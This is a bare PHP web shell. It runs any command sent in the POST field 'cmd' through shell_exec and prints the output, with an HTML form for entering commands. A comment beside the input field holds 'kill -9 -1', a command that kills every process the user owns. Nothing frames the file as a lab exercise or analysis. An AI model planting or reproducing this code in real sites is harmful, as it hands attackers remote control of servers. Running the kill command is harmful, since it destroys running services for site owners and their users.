
<?php
if(isset($_POST['cmd'])){
echo $output=shell_exec($_POST['cmd']);

}

?>


<form method="post">
<input type="text" name="cmd"><!-- kill -9 -1 --!>
<input type="submit">

</form>